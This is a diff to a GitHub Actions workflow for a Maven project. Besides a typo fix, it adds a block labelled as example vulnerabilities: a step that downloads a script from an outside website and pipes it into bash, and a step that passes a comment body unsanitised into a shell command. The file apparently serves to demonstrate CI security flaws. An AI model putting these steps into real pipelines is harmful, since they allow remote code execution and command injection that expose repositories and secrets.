@@ -8,7 +8,6 @@ on:
 
 jobs:
   build:
-
     runs-on: ubuntu-latest
 
     steps:
@@ -28,9 +27,18 @@ jobs:
     - name: Run tests
       run: mvn test
 
-    - name: Send a notifiction on the Discord server
+    - name: Send a notification on the Discord server
       run: |
         curl -H "Content-Type: application/json" \
             -d '{"username": "GitHub Bot", "content": "### New commit on main branch\nRepository: '${{ github.repository }}'\nCommit: '${{ github.sha }}'\nActor: '${{github.actor}}'"}' \
             ${{ secrets.DISCORD_WEBHOOK }}
-            
+    
+    ###### Example of vulnerabilities:
+
+    - name: Run a script from an unkown source
+      run: curl -s https://bluetobystudio.com/deploy.sh | bash
+
+    - name: Injection
+      run: ./check_password ${{ github.event.comment.body }}
+
+    - uses: step-security/harden-runner@v2.11.1
